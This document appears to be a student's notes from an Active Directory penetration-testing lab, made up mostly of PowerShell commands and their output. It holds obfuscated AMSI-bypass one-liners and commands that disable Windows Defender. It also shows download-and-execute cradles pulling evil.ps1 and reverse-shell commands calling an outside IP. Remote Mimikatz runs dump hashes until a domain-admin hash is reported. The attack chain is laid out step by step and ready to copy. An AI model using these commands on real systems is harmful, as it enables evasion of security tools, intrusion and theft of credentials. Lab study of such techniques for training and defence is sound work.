C:\Users\Naveen>cmd /c "hostname & whoami & ipconfig & whoami /priv"

Get domain information

Ipconfig /all
PS C:\Users\student157> [System.Net.Dns]::GetHostByName(($env:computerName))  

PS C:\Users\student157> $ADClass = [System.DirectoryServices.ActiveDirectory.Domain]
PS C:\Users\student157> $ADClass::GetCurrentDomain()

Script execution examples: 

	• Load a PowerShell script using dot sourcing PS . C:\AD\Tools\Powershell.ps1
	• A module can be imported with:  --> Import-Module <modulename> .psd (file Name)
	• All the commands in a module can be listed with:  -->  Get-Command -Module <modulename>

PowerShell script enumeration and usage also difference between < > { } etc.…
Once the script successfully loaded into the memory and we can call each and every function along with the examples such as -full, -detailed

	•     "get-help Get-NetGroup"
	•     "get-help Get-NetGroup -examples".
	•     "get-help Get-NetGroup -full".
	•     "get-help Get-NetGroup -detailed".
	•     "show-command Get-NetGroup".
	•     "Update-Help"  -- update help system

PS C:\AD\Tools> get-help Get-NetGroup

SYNTAX
    Get-NetGroup [[-GroupName] <String>] [[-SID] <String>] [[-UserName] <String>] [[-Filter] <String>] [[-Domain] <String>]
    [[-DomainController] <String>] [[-ADSpath] <String>] [-AdminCount] [-FullData] [-RawSids] [-AllTypes] [[-PageSize]
    <Int32>] [[-Credential] <PSCredential>] [<CommonParameters>]

Exclusion adding for specific path

The local enhanced login and system word prescription and amsi and script block logging.



powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath 'C:\AD'"

sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )

S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

Disable anti-virus real time protection

https://www.puckiestyle.nl/amsi-bypass/
http://www.labofapenetrationtester.com/2016/09/amsi.html
https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html

Set-MpPreference -DisableRealtimeMonitoring $true

PowerShell script execution bypass

powershell -ep bypass
powershell - ExecutionPolicy bypass
powershell -c <cmd>
powershell -encodedcommand
$env:PSExecutionPolicyPreference =="bypass"

Find Local admin Access

PS C:\AD\Tools> Find-LocalAdminAccess -Verbose
PS C:\AD\Tools> Invoke-CheckLocalAdminAccess -ComputerName dcorp-stud157.dollarcorp.moneycorp.local

PS C:\AD\Tools> . .\Find-WMILocalAdminAccess.ps1
PS C:\AD\Tools> Find-WMILocalAdminAccess -ComputerFile .\computers.txt

Find computers where a domain admin (or specified user/group) has sessions:

PS C:\AD\Tools> Invoke-UserHunter -Verbose   
PS C:\AD\Tools> Invoke-UserHunter -Verbose -GroupName "rdpusers"

To confirm admin access
PS C:\AD\Tools> Invoke-UserHunter -CheckAccess
Find computers where a domain admin is logged in.
PS C:\AD\Tools> Invoke-UserHunter -stealth

Enemerate session on any machine

PS C:\AD\Tools> Get-NetSession -ComputerName dcorp-dc.dollarcorp.moneycorp.local

AMSI Bypass one-line script

sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]("{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL)."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ))."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),("{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'))."sE`T`VaLUE"(${n`ULl},${t`RuE} )

Load PowerShell Module or Script in Remote:



iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')

$ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://192.168.230.1/evil.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response

PSv3 onwards:  -iex (iwr 'http://192.168.230.1/evil.ps1')

$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://192.168.230.1/evil.ps1',$false);$h.send();iex $h.responseText



PowerShell has 4 language mode

	• No language
	• Constant Language
	• Restricted language
	• Full language mode 





















PS C:\AD\Tools> Find-LocalAdminAccess -Verbose
VERBOSE: [*] Enumerating server dcorp-stud158.dollarcorp.moneycorp.local (14 of 20)
PS C:\AD\Tools> Find-LocalAdminAccess
dcorp-adminsrv.dollarcorp.moneycorp.local
PS C:\AD\Tools> 

PS C:\AD\Tools> Invoke-CheckLocalAdminAccess -ComputerName dcorp-stud157.dollarcorp.moneycorp.local

ComputerName                             IsAdmin
------------                             -------
dcorp-stud157.dollarcorp.moneycorp.local   False


PS C:\AD\Tools> Invoke-CheckLocalAdminAccess -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local

ComputerName                              IsAdmin
------------                              -------
dcorp-adminsrv.dollarcorp.moneycorp.local    True





As we have localAdmin privileges we can disable windows defender 
Issue: anti-virus of payload (unzip it again refresh) second problem is that firewall incoming connection so let's it off.

Set-MpPreference -DisableRealtimeMonitoring $true (OR) Set-MpPreference -DisableIOAVProtection $true

2. PS C:\AD\Tools> . .\PowerView.ps1   -->  where studentx has local administrative access.  (Find-PSRemotingLocalAdminAccess.ps1 script)
PS C:\AD\Tools> Find-LocalAdminAccess
dcorp-stud157.dollarcorp.moneycorp.local
dcorp-adminsrv.dollarcorp.moneycorp.local

3.  make sure that have to disabled firewall incoming connection (Reverse connective or any shell for an access_

powershell.exe iex (iwr http://172.16.100.157/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Invoke-PowerShellTcp -Reverse -IPAddress 172.16.100.157 -Port 443
or
powershell.exe -c iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.157/Invoke-PowerShellTcp.ps1'));Invoke-PowerShellTcp -Reverse -IPAddress 172.16.100.157 -Port 443

Ciadmin(Web Application got an shell(Hostname dcorp-ci) & Adminsrv (from local admin access)
PS C:\AD\Tools> Find-LocalAdminAccess
dcorp-stud157.dollarcorp.moneycorp.local
dcorp-adminsrv.dollarcorp.moneycorp.local

You can use the modified version of powerview as well as you can bypass mg. we can use this current session only.



PS C:\Program Files (x86)\Jenkins\workspace\project0> Invoke-UserHunter (checking for local admin privilege on session)

PS C:\Program Files (x86)\Jenkins\workspace\project0> Invoke-UserHunter -checkaccess
UserDomain      : dcorp
UserName        : svcadmin                                                                              
ComputerName    : dcorp-mgmt.dollarcorp.moneycorp.local  --> 
IPAddress       : 172.16.4.44
SessionFrom     :
SessionFromName :
LocalAdmin      : True

PS C:\Program Files (x86)\Jenkins\workspace\project0> Invoke-Command -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local -ScriptBlock {whoami;hostname}  --verification 
dcorp\ciadmin
dcorp-mgmt

PS C:\Program Files (x86)\Jenkins\workspace\project0> whoami  --> find dcorp-mgment have local privilege and also access to us.
dcorp\ciadmin

PS C:\Program Files (x86)\Jenkins\workspace\project0> iex (iwr http://172.16.100.157/Invoke-Mimikatz.ps1 -UseBasicParsing)  --> dump hashes 
PS C:\Program Files (x86)\Jenkins\workspace\project0> $sess = New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local   --> create session for execute your payload in remote machine before must be disable anti-virus (because anti-virus will block in memory for execution)

PS C:\Program Files (x86)\Jenkins\workspace\project0> Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess

PS C:\Program Files (x86)\Jenkins\workspace\project0> Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess

Now we have got svcadmin  account. 






PS C:\AD\Tools> . .\PowerView.ps1

PS C:\AD\Tools> Find-LocalAdminAccess
dcorp-stud157.dollarcorp.moneycorp.local     --> your first machine.
dcorp-adminsrv.dollarcorp.moneycorp.local    --> local admin access machine

PS C:\AD\Tools> . .\Find-PSRemotingLocalAdminAccess.ps1
PS C:\AD\Tools> Find-PSRemotingLocalAdminAccess
dcorp-stud157
dcorp-adminsrv

PS C:\Windows\system32>  Invoke-Command -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local -ScriptBlock {whoami;hostname}
dcorp\svcadmin
dcorp-adminsrv
PS C:\Windows\system32>

Also, any attempt to run Invoke-Mimikatz on dcorp-adminsrv results in errors about language mode.   -->  language mode.  explained in enumeration
This is because Applocker is configured on dcorp-mgmt and we drop into a ConstrainedLanguage Mode when we connect using PowerShell Remoting.

[dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Users\student157\Documents> $ExecutionContext.SessionState.LanguageModeConstrainedLanguage
Now, let’s enumerate the applocker policy.

[dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Users\student157\Documents> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

PathConditions      : {%PROGRAMFILES%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 06dce67b-934c-454f-a263-2515c8796a5d
Name                : (Default Rule) All scripts located in the Program Files folder
Description         : Allows members of the Everyone group to run scripts that are located in the Program Files folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow



We have exception from the program directory









Now we have srvadmin user account hash.









Now we have svcadmin user account hash.(member of domain admin).



Got domain admin hash























Svcadmin is domain admin privileges 






 
AppLocker or windows defender application control. 



















![image](https://github.com/user-attachments/assets/57ef27a9-3506-4aa4-9e07-59696aec7eee)
